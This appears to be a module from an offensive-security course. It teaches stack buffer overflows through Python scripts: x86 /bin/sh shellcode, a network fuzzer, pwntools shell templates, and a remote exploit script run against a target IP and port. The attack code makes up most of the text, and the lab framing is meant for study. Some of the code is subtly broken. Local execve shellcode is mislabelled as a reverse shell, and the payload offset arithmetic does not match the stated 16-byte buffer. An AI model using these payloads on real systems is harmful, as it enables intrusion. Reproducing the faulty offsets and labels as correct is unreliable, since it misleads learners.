# Module 5 — Exploit Development Fundamentals

## What You'll Actually Do

Understand buffer overflows at the code level. Write Python scripts that craft exploit payloads, interact with vulnerable binaries, and demonstrate control over program execution. This is controlled lab work only.

## Understanding the stack

```python
# Understanding buffer overflows conceptually
# This module teaches you to THINK about exploitation, not attack live systems

def explain_stack_layout():
    """The stack grows downward. Local variables are allocated on it."""
    # Simplified stack layout for a vulnerable function:
    #
    # High address
    # ┌─────────────────┐
    # │   function args  │
    # ├─────────────────┤
    # │   return addr    │  ← We want to overwrite this
    # ├─────────────────┤
    # │   saved EBP      │
    # ├─────────────────┤
    # │   buffer         │  ← Input goes here
    # │   (16 bytes)     │     If input > 16 bytes, it overflows
    # └─────────────────┘
    # Low address
    #
    # If we write beyond the buffer, we overwrite the return address.
    # When the function returns, it jumps to OUR address instead.
    print(explain_stack_layout.__doc__)

# The vulnerable C program we're targeting (in our lab):
# #include <string.h>
# #include <stdio.h>
# void vuln(char *input) {
#     char buffer[16];
#     strcpy(buffer, input);  // No bounds checking — overflow!
# }
# int main(int argc, char **argv) {
#     vuln(argv[1]);
#     return 0;
# }
```

## Crafting shellcode

```python
import struct

def pack_address(addr):
    """Pack a 32-bit address in little-endian format (x86)."""
    return struct.pack('<I', addr)

def generate_nop_sled(size):
    """NOP sled — any address in this range lands on NOPs and slides to shellcode."""
    return b'\x90' * size

def build_overflow_payload(target_addr, shellcode, buffer_size=16):
    """
    Build a buffer overflow payload.
    [NOP sled][shellcode][padding][return address]
    """
    nop_sled = generate_nop_sled(buffer_size - len(shellcode) - 4)
    padding = b'A' * 4  # Overwrite saved EBP
    ret_addr = pack_address(target_addr)

    payload = nop_sled + shellcode + padding + ret_addr
    return payload

# Example: reversing a shell (linux x86) — educational only
REVERSE_SHELL = (
    b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e'
    b'\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
)

# Build the payload
payload = build_overflow_payload(0xbffff5c0, REVERSE_SHELL)
print(f"Payload length: {len(payload)} bytes")
print(f"Payload hex: {payload.hex()}")
```

## Fuzzing — finding the offset

```python
import socket
import struct

def fuzz_offset(target, port, max_size=500):
    """
    Send increasing buffer sizes to find the crash point.
    The offset where EIP is overwritten tells us where to put our return address.
    """
    pattern = b'A' * 100
    for size in range(100, max_size + 50, 50):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.recv(1024)  # Banner
            payload = b'OVERFLOW ' + b'A' * size
            s.send(payload)
            response = s.recv(1024)
            s.close()
            print(f"  Sent {size} bytes — no crash")
        except ConnectionRefusedError:
            print(f"  [!] Crash at {size} bytes")
            return size
        except Exception as e:
            print(f"  [!] Connection lost at {size} bytes: {e}")
            return size
    return None

def find_exact_offset(target, port, crash_size):
    """Binary search for exact offset after finding approximate crash point."""
    low, high = crash_size - 50, crash_size
    while low < high:
        mid = (low + high) // 2
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.recv(1024)
            payload = b'OVERFLOW ' + b'A' * mid
            s.send(payload)
            s.recv(1024)
            s.close()
            low = mid + 1
        except:
            high = mid
    return low
```

## Working with pwntools

```python
from pwn import *

# pwntools makes exploit development much cleaner

def exploit_with_pwn(target, port):
    """Basic pwntools exploit template."""
    # Connect to target
    io = remote(target, port)

    # Receive banner
    banner = io.recvline()
    print(f"Banner: {banner}")

    # Build payload
    context.arch = 'i386'
    shellcode = asm(shellcraft.sh())
    payload = flat(
        b'A' * 16,       # Buffer padding
        b'B' * 4,        # Saved EBP
        b'C' * 4,        # Return address (we'll find this)
        shellcode        # Our code
    )

    # Send payload
    io.sendline(payload)
    io.interactive()

def find_rop_gadgets(binary_path):
    """Find ROP gadgets in a binary for Return-Oriented Programming."""
    elf = ELF(binary_path)
    rop = ROP(elf)
    print(rop.gadgets)
    return rop

def pattern_create(length):
    """Create a cyclic pattern to find offset."""
    return cyclic(length)

def pattern_offset(value):
    """Find offset of a value in the cyclic pattern."""
    return cyclic_find(value)
```

## Exploit template for a simple overflow

```python
#!/usr/bin/env python3
"""
Exploit template for buffer overflow in a vulnerable service.
This is for lab use only against intentionally vulnerable binaries.
"""
import socket
import struct
import sys

def exploit(target, port, ret_addr):
    """Send exploit payload."""
    # NOP sled + shellcode
    nops = b'\x90' * 64
    shellcode = (
        b'\x31\xc0\x50\x68\x2f\x2f\x73\x68'
        b'\x68\x2f\x62\x69\x6e\x89\xe3\x50'
        b'\x53\x89\xe1\xb0\x0b\xcd\x80'
    )

    # Buffer: 16 bytes + 4 bytes saved EBP + 4 bytes return addr
    padding = b'A' * 16
    ebp = b'B' * 4
    ret = struct.pack('<I', ret_addr)

    payload = nops + shellcode
    payload = payload.ljust(16 + 4, b'\x90')  # Pad to return address
    payload += ret

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.recv(1024)  # Receive banner
    s.send(payload)
    print(f"[*] Payload sent ({len(payload)} bytes)")
    s.close()

def find_return_address(target, port, crash_offset):
    """
    Send a pattern and find where the return address lands.
    After crash, check the EIP value in debugger and use:
    python3 -c "from pwn import *; print(cyclic_find(0x<eip_value>))"
    """
    pattern = cyclic(500)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.recv(1024)
    s.send(b'OVERFLOW ' + pattern)
    try:
        s.recv(1024)
    except:
        pass
    s.close()
    print("[*] Check crash in debugger for EIP value")

if __name__ == '__main__':
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <target> <port> <ret_addr_hex>")
        print(f"Example: {sys.argv[0]} 192.168.1.100 9999 0xbffff5c0")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2])
    ret_addr = int(sys.argv[3], 16)
    exploit(target, port, ret_addr)
```

## Assessment

**Lab Task — Exploit a vulnerable binary in a controlled environment (90 minutes)**

1. Set up a VM with a deliberately vulnerable program (use the one provided or compile from source)
2. Use your fuzzer to find the crash offset
3. Verify the offset using a cyclic pattern and a debugger
4. Build an exploit payload that overwrites the return address
5. Achieve a shell (or reverse connection) through the overflow

**Grading:**
- Fuzzer runs and identifies crash point: 20 pts
- Correct offset identification verified with debugger: 25 pts
- Payload correctly overwrites EIP/return address: 25 pts
- Code execution achieved (shell or reverse shell): 20 pts
- Script is documented and repeatable: 10 pts

## Evidence

- Fuzzer output showing the crash point
- Debugger screenshot showing the overwritten return address
- Your exploit script
- Terminal showing successful code execution through the overflow
- Notes explaining each step of the exploit chain
